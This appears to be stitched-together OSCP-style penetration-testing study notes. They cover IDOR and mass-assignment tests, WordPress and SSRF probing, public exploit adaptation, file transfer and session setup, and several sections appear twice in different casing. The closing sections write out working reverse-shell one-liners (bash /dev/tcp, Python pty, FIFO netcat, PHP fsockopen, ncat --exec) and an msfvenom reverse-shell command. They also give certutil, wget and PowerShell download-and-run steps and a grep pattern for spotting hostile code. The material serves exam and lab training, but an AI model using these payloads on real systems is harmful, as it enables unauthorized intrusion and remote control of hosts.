# web access control, api logic and xss [← stage index](readme.md) · [web mapping](../02-service-enumeration/10-http-web-mapping.md) · [quick sheet](../../cheatsheets/web-exploitation.md#access-control-and-xss) · [mechanics](../../notes/master_notes.md#authorization-and-browser-context) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **use when:** the mapped application exposes object identifiers, roles/properties, privileged functions or user-controlled content rendered in a browser. ## object-level authorization / idor use two controlled lab identities and one object owned by each: ```http get /api/orders/object_b http/1.1 host: domain authorization: bearer user_a_token ``` 1. save user a's successful request for object a. 2. change only the path/query/body object reference to object b. 3. keep a's token. 4. verify disclosure or the intended update/delete effect against b's object. > **decisive output:** data or a state change belonging to b under a's context. a different error or `200` wrapper is not enough. ## function- and role-level authorization replay the same operation as: ```text anonymous -> ordinary user -> alternate ordinary user -> administrator ``` compare ui and api paths, then test the legitimate method variants suggested by captured traffic or documentation. ```bash curl -ski -b user-a.cookies http://target:port/admin/path curl -ski -x post -b user-a.cookies -h 'content-type: application/json' -d '{"action":"expected_action"}' http://target:port/api/admin/path ``` > **failure cue:** a route name containing `admin` does not establish a bypass. verify a privileged read or action under the lower-privileged identity. ## mass assignment / excessive properties start with a valid captured registration/update request and add one server-owned property: ```bash curl -ski -x post -h 'content-type: application/json' -d '{"username":"test_user","password":"test_password","role":"administrator"}' http://target:port/api/v1/register ``` > **decisive output:** authenticate as the new/updated identity and perform an administrator-only action. an echoed or stored `role` field may be ignored by authorization logic.

# wordpress and ssrf paths [← stage index](readme.md) | [http mapping](../02-service-enumeration/10-http-web-mapping.md) | [web cheatsheet](../../cheatsheets/web-exploitation.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [turn application weaknesses into access](../../notes/methods/web-exploitation.md) ## wordpress: establish the deployment first > **recognition:** wordpress-specific paths/assets, generator metadata, rest routes or `wp-content`. **prerequisite:** correct scheme, host header and base path. **decisive output:** core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. ```bash curl -ski https://hostname/ curl -sk https://hostname/robots.txt curl -sk https://hostname/wp-json/ | head curl -sk https://hostname/wp-content/ curl -sk https://hostname/wp-login.php -o wp-login.html ``` inspect page source for `/wp-content/plugins/name/`, `/wp-content/themes/name/`, versioned assets and alternate base paths. a visible version is a candidate, not exploitability proof.
wpscan inventory ```bash wpscan --url https://hostname/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-hostname.txt ``` > wpscan can be useful for component/user candidates, but verify every useful result manually. vulnerability-database details may require an api token; never place a token in published notes or command history.
## wordpress authentication and post-authentication mapping validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. ```bash curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=user' \ --data-urlencode 'pwd=password' \ --data-urlencode 'wp-submit=log in' \ --data-urlencode 'redirect_to=https://hostname/wp-admin/' \ https://hostname/wp-login.php -d wp-login.headers curl -sk -b wp.cookies https://hostname/wp-admin/ -o wp-admin.html ``` > a redirect alone is inconclusive. confirm an authenticated page marker and the actual role. useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. xml-rpc exposure is a feature clue, not automatically a vulnerability: ```bash curl -sk -x post https://hostname/xmlrpc.php \ -h 'content-type: text/xml' \ --data 'system.listmethods' ``` ## ssrf: prove server-side fetching safely > **recognition:** url import, webhook, image/pdf fetch, feed preview, link unfurling or callback validation. **prerequisite:** a parameter that the server dereferences. **decisive output:** a request observed at a controlled listener or a stable response difference tied to the destination. listener: ```bash python3 -m http.server lport --bind 0.0.0.0 ``` hypothetical request replay: ```bash curl -sk 'https://hostname/fetch?url=http://lhost:lport/ssrf-marker' ``` interpret the path explicitly: ```text browser/client -> vulnerable application -> requested url ``` the application, not kali, must resolve and reach the destination. a browser-side fetch, open redirect or reflected url does not prove ssrf.
internal destination and parser variations ```bash # only after an external controlled callback proves server-side fetching curl -sk 'https://hostname/fetch?url=http://127.0.0.1:port/' curl -sk 'https://hostname/fetch?url=http://localhost:port/' # preserve encoding when the url is nested in form data curl -sk -x post https://hostname/fetch \ --data-urlencode 'url=http://127.0.0.1:port/' ``` > compare status, body marker, size and timing against a closed-port control. internal http content establishes reachability/read capability, not command execution.
## failure-guided routing - callback never arrives: verify the parameter is fetched server-side, the listener address, return route, url parser and allowed schemes. - external callback works but loopback fails: destination filtering, container/network namespace or application proxying may differ. - all internal ports look identical: the application may normalize errors; use a known-open/known-closed comparison and stable markers. - redirect accepted but final destination blocked: determine whether validation happens before or after redirects without assuming a bypass. - wordpress scanner finds a component but the path/version is absent: manually confirm the active component and vulnerable configuration. ## sources - [getsh web route](https://lizajose.github.io/getsh/web), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [wpscan project documentation](https://github.com/wpscanteam/wpscan) - [portswigger ssrf overview](https://portswigger.net/web-security/ssrf) - [hexdump web modules](https://github.com/leonardoe95/oscp/tree/main/modules/web)

# public exploit selection and adaptation [← stage index](readme.md) | [shell/session procedure](../04-shells-transfers-credentials/02-shells-and-payloads.md) | [quick sheet](../../cheatsheets/public-exploits.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [select and adapt public exploits](../../notes/methods/public-exploits.md); [establish sessions and move files](../../notes/methods/sessions-transfers.md) > **purpose:** turn exact product/configuration evidence into a reviewed, minimally modified exploit that proves the intended effect. a version string or cve match is only a candidate. ## record the candidate ```text source url/edb-id/cve/commit: product + component + edition/build: target os/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: ``` do not substitute a scanner label for component evidence. check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. ## search narrowly ```bash searchsploit --cve cve searchsploit -t "product version" searchsploit product version --exclude="/dos/" ``` inspect before copying: ```bash searchsploit -p edb_id searchsploit -x edb_id searchsploit -w "product version" ``` copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m edb_id sha256sum exploit_file file exploit_file ``` > **selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. exclude denial-of-service entries when the objective is access. a named nmap nse script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help script_name sed -n '1,240p' /usr/share/nmap/scripts/script_name.nse nmap -pn -p port --script script_name --script-args 'arg=value' target ``` script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. a script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
variant — source repository rather than exploit-db record and pin the exact source state: ```bash git clone repository_url exploit-source cd exploit-source git log -1 --format='%h %ad %s' --date=iso-strict git status --short ``` read the readme, license, dependency files, open issues relevant to the target version and the actual execution path. a popular repository is not automatically safe or compatible.
variant — a matching metasploit exploit module use only in an authorized lab or after committing the current exam's one allowed metasploit/meterpreter target. even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit product cve info module_name use module_name show options show targets show payloads set rhosts target set rport port set target target_id set payload payload_name set lhost lhost set lport lport check run ``` read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. a module rank or `check` result does not replace exact prerequisite validation or session verification.
## audit untrusted code before execution start with metadata and readable text: ```bash file exploit_file sha256sum exploit_file sed -n '1,240p' exploit_file grep -nei 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' exploit_file ``` for binaries, prefer obtaining inspectable source. if only a binary exists, treat it as a substantially higher-risk choice: ```bash file exploit_binary sha256sum exploit_binary strings -a exploit_binary | less objdump -f exploit_binary ``` audit for: - unexpected privilege requirements on the attacking host; - destructive file/process/service operations or denial of service; - downloads, callbacks or telemetry to third parties; - embedded credentials, tokens, commands or payloads; - files written or overwritten and their cleanup behavior; - hard-coded target addresses, ports, paths, virtual hosts and callback values; - authentication, cookie, csrf, redirect, tls and proxy assumptions; - target os, architecture, runtime, library and payload assumptions; - success messages that are printed without verifying the claimed effect. > **safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. do not grant `sudo` merely because an unknown poc requests it. ## establish the runtime before changing code ```bash head -n 1 exploit_file python3 --version gcc --version file exploit_file ``` separate three architectures: 1. where the exploit program itself runs; 2. the vulnerable target process; 3. the payload that will execute inside or on the target. a remote python exploit may run on kali while delivering a windows x64 payload. a local linux exploit normally must run on the target-compatible architecture. compiler choice follows the produced program; ## record the candidate

```text
source url/edb-id/cve/commit:
product + component + edition/build:
target os/architecture/runtime:
remote or local; pre-auth or authenticated:
required configuration/feature/path/credential/privilege:
expected effect:
exploit runtime and dependencies:
hard-coded target/callback/payload assumptions:
destructive or stability risk:
evidence each prerequisite exists:
```

## search narrowly ```bash searchsploit --cve cve searchsploit -t "product version" searchsploit product version --exclude="/dos/" ``` inspect before copying: ```bash searchsploit -p edb_id searchsploit -x edb_id searchsploit -w "product version" ``` copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m edb_id sha256sum exploit_file file exploit_file ``` > **selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. exclude denial-of-service entries when the objective is access. a named nmap nse script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help script_name sed -n '1,240p' /usr/share/nmap/scripts/script_name.nse nmap -pn -p port --script script_name --script-args 'arg=value' target ``` script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. a script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
variant — source repository rather than exploit-db record and pin the exact source state: ```bash git clone repository_url exploit-source cd exploit-source git log -1 --format='%h %ad %s' --date=iso-strict git status --short ``` read the readme, license, dependency files, open issues relevant to the target version and the actual execution path. a popular repository is not automatically safe or compatible.
variant — a matching metasploit exploit module use only in an authorized lab or after committing the current exam's one allowed metasploit/meterpreter target. even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit product cve info module_name use module_name show options show targets show payloads set rhosts target set rport port set target target_id set payload payload_name set lhost lhost set lport lport check run ``` read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. a module rank or `check` result does not replace exact prerequisite validation or session verification.

## establish the runtime before changing code

```bash
head -n 1 exploit_file
python3 --version
gcc --version
file exploit_file
```

separate three architectures:

1. where the exploit program itself runs;
2. the vulnerable target process;
3. the payload that will execute inside or on the target.

a remote python exploit may run on kali while delivering a windows x64 payload. a local linux exploit normally must run on the target-compatible architecture. compiler choice follows the produced program; payload choice follows the target execution context.

## repair a web exploit from the real transaction

before changing the script, reproduce the relevant request with burp or curl and compare:

```bash
curl -i -x method 'scheme://hostname:port/path' \
  -h 'host: hostname' \
  -h 'cookie: cookie' \
  --data 'param=value'
```

for a scoped lab with a known self-signed certificate:

```bash
curl -k -i 'https://hostname:port/path'
```

in python requests, use a session when cookies or defaults must persist:

```python
with requests.session() as session:
    response = session.get(url, timeout=10)
    print(response.status_code, response.url)
    print(response.headers)
    print(response.text[:500])
```

set `verify=false` only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. prefer a supplied ca bundle when possible.

> **parser cue:** `indexerror`, missing-key and regular-expression failures mean the received response did not have the assumed shape. print status, final url, headers and a bounded body fragment before rewriting the parser. common causes are a changed path, redirect, failed login, csrf change, error page, proxy/waf response or certificate handling.

# Public Exploit Selection and Adaptation [← Stage index](README.md) | [Shell/session procedure](../04-shells-transfers-credentials/02-shells-and-payloads.md) | [Quick sheet](../../cheatsheets/public-exploits.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Select and adapt public exploits](../../notes/methods/public-exploits.md); [Establish sessions and move files](../../notes/methods/sessions-transfers.md) > **Purpose:** turn exact product/configuration evidence into a reviewed, minimally modified exploit that proves the intended effect. A version string or CVE match is only a candidate. ## Record the candidate ```text source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: ``` Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. ## Search narrowly ```bash searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" ``` Inspect before copying: ```bash searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" ``` Copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE ``` > **Selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET ``` Script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
Variant — source repository rather than Exploit-DB Record and pin the exact source state: ```bash git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short ``` Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. A popular repository is not automatically safe or compatible.
Variant — a matching Metasploit exploit module Use only in an authorized lab or after committing the current exam's one allowed Metasploit/Meterpreter target. Even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run ``` Read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. A module rank or `check` result does not replace exact prerequisite validation or session verification.
## Audit untrusted code before execution Start with metadata and readable text: ```bash file EXPLOIT_FILE sha256sum EXPLOIT_FILE sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE ``` For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice: ```bash file EXPLOIT_BINARY sha256sum EXPLOIT_BINARY strings -a EXPLOIT_BINARY | less objdump -f EXPLOIT_BINARY ``` Audit for: - unexpected privilege requirements on the attacking host; - destructive file/process/service operations or denial of service; - downloads, callbacks or telemetry to third parties; - embedded credentials, tokens, commands or payloads; - files written or overwritten and their cleanup behavior; - hard-coded target addresses, ports, paths, virtual hosts and callback values; - authentication, cookie, CSRF, redirect, TLS and proxy assumptions; - target OS, architecture, runtime, library and payload assumptions; - success messages that are printed without verifying the claimed effect. > **Safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant `sudo` merely because an unknown PoC requests it. ## Establish the runtime before changing code ```bash head -n 1 EXPLOIT_FILE python3 --version gcc --version file EXPLOIT_FILE ``` Separate three architectures: 1. where the exploit program itself runs; 2. the vulnerable target process; 3. the payload that will execute inside or on the target. A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload choice follows the target execution context. ## Python exploit workflow After source review: ```bash python3 -m py_compile exploit.py python3 exploit.py --help ``` Isolate explicit dependencies: ```bash python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt ``` > Run `--help` only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, `str`/`bytes` mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence. Useful diagnostics: ```bash python3 -X dev exploit.py ARGUMENTS python3 -m trace --trace exploit.py ARGUMENTS ``` Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once. ## Compile reviewed source Linux/ELF program: ```bash gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit ``` 32-bit output requires matching headers/libraries: ```bash gcc -m32 -Wall -Wextra exploit.c -o exploit32 file exploit32 ``` Windows PE from Kali: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe file exploit-x86.exe exploit-x64.exe ``` Windows socket code commonly needs the Winsock import library: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 ``` > **Failure cue:** undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. `Exec format error` means the produced format/architecture cannot run in the current environment. ## Make the smallest supported edit Change one assumption at a time and retain a diff: ```bash cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE ``` Typical adaptations are: | Assumption | Evidence-backed edit | | --- | --- | | Target address/port | Observed reachable endpoint | | HTTP/HTTPS and base path | Reproduced application request | | Virtual host or `Host` header | Resolved application identity | | Username/password/cookie | Valid Block 5 authentication context | | CSRF/session parsing | Actual request/response sequence | | LHOST/LPORT | Address and listener reachable from the target context | | Command or payload | Target OS, interpreter, architecture, size and bad-character constraints | | File path/name | Writable/executable target path and application behavior | | Timeout/retry | Measured service behavior, not blind delay inflation | Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change. ## Repair a web exploit from the real transaction Before changing the script, reproduce the relevant request with Burp or curl and compare: ```bash curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' ``` For a scoped lab with a known self-signed certificate: ```bash curl -k -i 'https://HOSTNAME:PORT/PATH' ``` In Python Requests, use a session when cookies or defaults must persist: ```python with requests.Session() as session: response = session.get(url, timeout=10) print(response.status_code, response.url) print(response.headers) print(response.text[:500]) ``` Set `verify=False` only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible. > **Parser cue:** `IndexError`, missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling. ## Adapt an existing memory-corruption PoC only as required > Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence. Review the PoC comments and code for: - exact vulnerable build and target architecture; - hard-coded target/callback address and port; - return address/module assumptions and target profiles; - recorded offset, available payload space and bad characters; - payload architecture, type and exit behavior; - crash/restart and reliability expectations. Replace an embedded payload only when the PoC documents its constraints: ```bash msfvenom -p windows/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f c -v payload \ -b '\x00\x0a\x0d' ``` Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route. ## Prove effects in increasing order ```text exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position ``` Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result. ## Failure routing | Symptom | Interpretation / next action | | --- | --- | | No matching candidate | Improve component/build/configuration evidence; do not force a generic CVE | | PoC requests suspicious local privilege | Stop and audit or use an isolated snapshot | | Import/module error | Reproduce dependencies in a per-tool environment | | Python syntax/bytes error | Resolve runtime-version compatibility before judging the target | | Compiler error | Fix source/header/type problem named by compiler | | Undefined reference | Link the documented library; inspect linker order | | `Exec format error` | Correct producer/consumer OS or architecture | | TLS/certificate failure | Confirm correct HTTPS endpoint; use CA or scoped test override | | Redirect/login/CSRF parser failure | Compare the real browser request and response state | | Exploit says success but effect absent | Treat as unconfirmed; inspect its success condition and target response | | Target crashes | Record stability risk; stop repeating without changed evidence | | Command execution works but no callback | Enter the shell/session diagnostic ladder | ## Handoff and evidence Record the original URL/EDB-ID/CVE/commit, original hash, exact target prerequisites, dependency/compiler state, modified diff, shellcode-generation command if applicable, invocation, raw result and independent verification. The current exam guide requires the original URL, modified code, highlighted changes and explanations when a public exploit is modified. Once command execution is proven, continue with [shells and payloads](../04-shells-transfers-credentials/02-shells-and-payloads.md). Do not make exploit adaptation carry listener, route and TTY problems that belong to the session layer. The current OSCP+ guide restricts Metasploit Auxiliary/Exploit/Post modules and Meterpreter to one selected target; selection is consumed even when the attempt or `check` fails. `msfvenom` and `multi/handler` have across-target exceptions, subject to the Meterpreter limit. AI chatbots are prohibited during the actual exam. ## Component/CVE lookup from the source cheatsheet Use this lookup when enumeration identifies the relevant component. # file transfer [← reference index](../../readme.md) · [previous: rdp access](../03-initial-access/01-rdp-access.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [establish sessions and move files](../../notes/methods/sessions-transfers.md) > **choose:** http pull when the target can reach kali; scp when ssh credentials work; smb for a windows-friendly read/write share; netcat or base64 only when the simpler route is unavailable. ## linux target: pull linpeas from kali over http on kali, serve the directory containing `linpeas.sh`: ```bash cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 ``` on the linux target, download into a writable directory and run it: ```bash wget http://lhost:8000/linpeas.sh -o /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt ``` > **read:** kali should log an http request and a successful response. a downloaded enumeration script is a lead generator; manually verify any escalation candidate.
http variants — fixed server directory, curl, windows and alternate built-ins ### serve a fixed directory without changing folders ```bash python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools ``` python's simple server supplies downloads over unencrypted http. stop it with `ctrl+c` when finished. ### linux target with curl ```bash curl -fl http://lhost:8000/file -o /tmp/file ``` `-f` reports http errors and `-l` follows redirects. use a writable destination. ### windows target with powershell run inside powershell: ```powershell invoke-webrequest -uri "http://lhost:8000/file" -outfile "c:\windows\temp\file" ``` from `cmd.exe`, invoke powershell explicitly: ```cmd powershell -noprofile -command "invoke-webrequest -uri 'http://lhost:8000/file' -outfile 'c:\windows\temp\file'" ``` ### windows alternatives ```powershell (new-object net.webclient).downloadfile('http://lhost:8000/file','c:\windows\temp\file') ``` ```cmd curl.exe -fl http://lhost:8000/file -o c:\windows\temp\file ``` ```cmd certutil.exe -urlcache -split -f http://lhost:8000/file c:\windows\temp\file ``` availability and policy can differ by host. `certutil` may leave url-cache artifacts; remove only artifacts you created when cleanup is appropriate.
## verify the transfer compare the source and destination hashes. on kali or linux: ```bash sha256sum file sha256sum /tmp/file ``` on windows: ```powershell get-filehash -algorithm sha256 "c:\windows\temp\file" ``` > **decisive output:** matching sha-256 values establish that the two saved files contain the same bytes. a successful http status alone does not.
scp — copy through an authenticated ssh service ### kali to a linux target ```bash scp file user@target:/tmp/file ``` ### linux target to kali run from kali when the target's ssh service is reachable: ```bash scp user@target:/path/to/file ./file ``` ### ssh key or nonstandard port ```bash scp -i key -p port file user@target:/tmp/file ``` `scp` uses uppercase `-p` for the ssh port. authentication success does not guarantee write permission at the destination path.
smb — read and write files from windows ### start an authenticated smb share on kali ```bash mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username user -password 'password' ``` the first positional value is the share name; the second is its local directory. the supplied `user` and `password` authenticate to this temporary kali share. some installations expose the legacy wrapper name: ```bash sudo smbserver.py transfer "$(pwd)/share" -smb2support -username user -password 'password' ``` ### connect and download from windows ```cmd net use \\lhost\transfer /user:user "password" copy \\lhost\transfer\file c:\windows\temp\file ``` ### upload evidence from windows to kali ```cmd copy c:\windows\temp\file \\lhost\transfer\file net use \\lhost\transfer /delete ``` kali must accept inbound tcp/445 and the target must permit outbound smb. the share is read/write unless started with impacket's `-readonly` option.
netcat — stream a file when a direct tcp connection is possible ### retrieve a file from the target to kali kali receives: ```bash nc -lvnp port > file ``` the target sends: ```bash nc -nv lhost port < /path/to/file ``` ### send a file from kali to the target the target receives: ```bash nc -lvnp port > /tmp/file ``` kali sends: ```bash nc -nv target port < file ``` if the listener rejects `-p`, use the openbsd-style form and check `nc -h` locally: ```bash nc -lvn port > file ``` netcat provides no authentication, encryption, filename metadata or integrity check. confirm direction and compare hashes afterward.
temporary ftp — only when an ftp client is the available route on kali, after intentionally selecting/installing `pyftpdlib` in an isolated environment: ```bash python3 -m pyftpdlib -p port ``` on the target: ```text ftp lhost port binary get file put file quit ``` the default temporary server can be unauthenticated and plaintext. bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. http/scp/smb are normally preferable.
base64 — move a small file through a text-only channel ### encode on linux ```bash base64 -w 0 file ``` ### decode on linux ```bash printf '%s' 'base64_data' | base64 -d > /tmp/file ``` ### decode in powershell ```powershell [io.file]::writeallbytes('c:\windows\temp\file',[convert]::frombase64string('base64_data')) ``` use this for small files. long encoded values are easy to truncate or corrupt; compare hashes.
failure cues — identify the broken layer | symptom | check next | | --- | --- | | kali logs no http request | confirm `lhost`, target-to-kali route, listener bind address and outbound filtering | | http returns 404 | confirm the server directory, exact filename and case | | destination reports permission denied | use a writable directory such as `/tmp` or the current user's windows temp directory | | file downloads but does not run | verify its hash, interpreter/architecture, execute permission and line endings | | scp authenticates but cannot write | change the remote destination to a directory writable by that identity | | smb connection fails | check tcp/445 reachability, credentials, smb2 support and existing windows connections to the same server | | netcat connects but the file differs | repeat with clear sender/receiver roles and compare hashes before executing |
## php http file server when python is unavailable use on the sending host when php cli is present and the receiver can reach it. serve a directory containing only the intended transfer artifacts. ```bash php -s 0.0.0.0:8000 -t ./transfer # receiver: use the actual sender address and verify the received artifact curl -f http://lhost:8000/file -o file ``` read: this is a file-serving route, not an upload server or a shell. check the http status, file size/hash and target architecture before execution. if the target cannot initiate this connection, choose another transfer direction/transport rather than restarting the same server. sources: [upstream 1](https://www.php.net/manual/en/features.commandline.webserver.php).

A downloaded enumeration script is a lead generator; manually verify any escalation candidate.

Stop it with `Ctrl+C` when finished. ### Linux target with curl ```bash curl -fL http://LHOST:8000/FILE -o /tmp/FILE ``` `-f` reports HTTP errors and `-L` follows redirects. ## Verify the transfer Compare the source and destination hashes. [resolve payload execution obstacles](../../notes/methods/execution.md) > **goal:** turn verified command execution into a session whose execution, transport and interaction properties are understood. every command is a generic authorized-lab reference, not a target assignment. ## keep four states separate ```text delivery → execution → connection → usable session ``` | state | decisive evidence | does not yet prove | | --- | --- | --- | | delivery | exact bytes/request reached intended consumer | payload executed | | execution | harmless command output or controlled side effect | network callback works | | connection | listener records the expected peer | commands and i/o are usable | | session | commands return and host/identity are verified | higher privilege or stability | do not change all four layers at once. preserve the last confirmed state and test the next boundary. ## choose the access form | situation | prefer | main prerequisite / limitation | | --- | --- | --- | | one bounded action is enough | direct command execution | observable output or side effect; no shell required | | valid credential and remote service | ssh, winrm or rdp | authentication plus remote-logon authorization | | target can reach kali | reverse shell | target egress and a reachable kali listener | | kali can reach a target listener | bind shell | target can bind and inbound path permits it | | payload is staged or protocol-aware | matching framework handler | handler must use the exact payload/transport | prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. ## map the callback before generating anything ```text trigger context → target process/interpreter and architecture → target source interface → route/egress controls → lhost address visible from target → lport → local bind interface → listener/handler ``` select `lhost` from the target's point of view. a vpn address, tunnel endpoint or reachable interface may be correct while kali's default-route address is wrong. on kali: ```bash ip -brief address ip route ss -lntp ``` windows source/listener checks: ```powershell get-netipaddress -addressfamily ipv4 get-netroute -addressfamily ipv4 get-nettcpconnection -state listen ``` ## listener baselines and netcat variants traditional/openbsd-style `nc` commonly used on kali: ```bash rlwrap nc -lvnp lport ``` nmap ncat uses a positional listen port; do not mechanically copy every `nc` flag: ```bash ncat -4 -lvn 0.0.0.0 lport ``` verify the bind in another terminal: ```bash ss -lntp | grep ':lport' ``` if multiple interfaces exist, bind deliberately: ```bash ncat -4 -lvn lhost lport ``` > **failure cue:** a listener bound only to `127.0.0.1`, the wrong vpn/interface address or the wrong address family cannot receive the expected callback. “address already in use” means another process owns the bind. ## prove command execution before requesting a shell linux: ```bash id; hostname; pwd ``` windows: ```cmd whoami & hostname & cd ``` for blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. do not interpret a hung http request as proof of a shell; the server may simply be waiting on a child process or timeout. ## linux reverse-shell baselines choose an interpreter that you confirmed exists. bash tcp: ```bash bash -c 'bash -i >& /dev/tcp/lhost/lport 0>&1' ``` python 3 with a pty: ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("lhost",lport));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` portable fifo plus netcat when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc lhost lport >/tmp/f ``` php cli: ```bash php -r '$s=fsockopen("lhost",lport);exec("/bin/sh -i <&3 >&3 2>&3");' ```
variant — target has ncat command execution linux: ```bash ncat lhost lport --exec /bin/sh ``` windows: ```cmd ncat.exe lhost lport --exec cmd.exe ``` `--exec` exposes the named program directly to the network connection. use only on the assigned host and remove transferred tooling when the exercise requires cleanup.
